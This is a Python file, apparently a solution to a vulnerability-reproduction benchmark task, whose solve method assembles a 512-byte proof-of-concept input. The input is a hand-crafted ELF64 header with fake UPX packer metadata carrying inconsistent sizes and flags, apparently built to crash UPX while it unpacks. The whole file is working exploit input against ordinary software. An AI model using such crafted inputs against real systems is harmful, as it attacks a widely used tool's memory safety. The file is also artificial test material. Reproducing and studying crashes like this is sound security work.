import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray(b'\x00' * 512)

        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 8
        e_type = 3
        e_machine = 62
        e_version = 1
        e_entry = 0
        e_phoff = 0x40
        e_shoff = 0
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 2
        e_shentsize = 0
        e_shnum = 0
        e_shstrndx = 0

        ehdr_pack = struct.pack('<16sHHIQQQIHHHHHH',
            e_ident, e_type, e_machine, e_version,
            e_entry, e_phoff, e_shoff,
            e_flags, e_ehsize, e_phentsize, e_phnum,
            e_shentsize, e_shnum, e_shstrndx)
        poc[0:len(ehdr_pack)] = ehdr_pack

        sizeof_l_info = 44
        sizeof_p_info = 12
        sizeof_b_info_array = 32

        l_info_file_offset = 0xb0
        p_info_file_offset = l_info_file_offset + sizeof_l_info
        b_info_file_offset = p_info_file_offset + sizeof_p_info
        metadata_end_offset = b_info_file_offset + sizeof_b_info_array

        ph1_type = 1
        ph1_flags = 7
        ph1_offset = 0
        ph1_vaddr = 0x400000
        ph1_paddr = 0x400000
        ph1_filesz = l_info_file_offset + sizeof_l_info
        ph1_memsz = 0x10000
        ph1_align = 0x1000
        
        ph1_pack = struct.pack('<IIQQQQQQ',
            ph1_type, ph1_flags, ph1_offset, ph1_vaddr,
            ph1_paddr, ph1_filesz, ph1_memsz, ph1_align)
        poc[0x40:0x40 + len(ph1_pack)] = ph1_pack
        
        ph2_type = 1
        ph2_flags = 7
        ph2_offset = metadata_end_offset
        ph2_vaddr = 0x401000
        ph2_paddr = 0x401000
        ph2_filesz = 1
        ph2_memsz = 0x2000
        ph2_align = 0x1000

        ph2_pack = struct.pack('<IIQQQQQQ',
            ph2_type, ph2_flags, ph2_offset, ph2_vaddr,
            ph2_paddr, ph2_filesz, ph2_memsz, ph2_align)
        poc[0x78:0x78 + len(ph2_pack)] = ph2_pack
        
        poc[ph2_offset] = 0x41

        l_info_pack = struct.pack('<4sBBBBIIIHHIIIII',
            b'UPX!',
            0x08,
            12,
            1,
            1,
            0,
            0,
            0,
            0,
            2,
            0,
            0,
            p_info_file_offset - l_info_file_offset,
            b_info_file_offset - l_info_file_offset,
            512
        )
        poc[l_info_file_offset : l_info_file_offset + len(l_info_pack)] = l_info_pack
        
        p_info_pack = struct.pack('<III',
            0,
            512,
            0x1000
        )
        poc[p_info_file_offset : p_info_file_offset + len(p_info_pack)] = p_info_pack
        
        b_info0_pack = struct.pack('<IIII',
            0x1000,
            2,
            0,
            0
        )
        poc[b_info_file_offset : b_info_file_offset + len(b_info0_pack)] = b_info0_pack

        b_info1_pack = struct.pack('<IIII',
            0x1000,
            0,
            1,
            0x80000000
        )
        poc[b_info_file_offset + 16 : b_info_file_offset + 16 + len(b_info1_pack)] = b_info1_pack

        return bytes(poc)
